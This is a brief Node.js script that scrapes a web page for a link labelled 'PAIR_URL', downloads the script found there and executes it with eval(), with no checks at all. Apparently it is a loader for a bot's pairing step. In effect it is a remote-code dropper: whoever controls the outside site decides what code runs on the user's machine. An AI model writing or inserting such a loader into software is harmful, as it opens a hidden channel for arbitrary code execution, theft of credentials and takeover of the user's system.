'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchPairUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const pairUrl = $(`a:contains("PAIR_URL")`).attr('href');

        if (!pairUrl) throw new Error('PAIR_URL not found on the webpage.');

        console.log('PAIR_URL fetched successfully:', pairUrl);

        const scriptResponse = await axios.get(pairUrl);
        const scriptContent = scriptResponse.data;
        console.log("PAIR_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching PAIR_URL:', error.message);
    }
}

fetchPairUrl();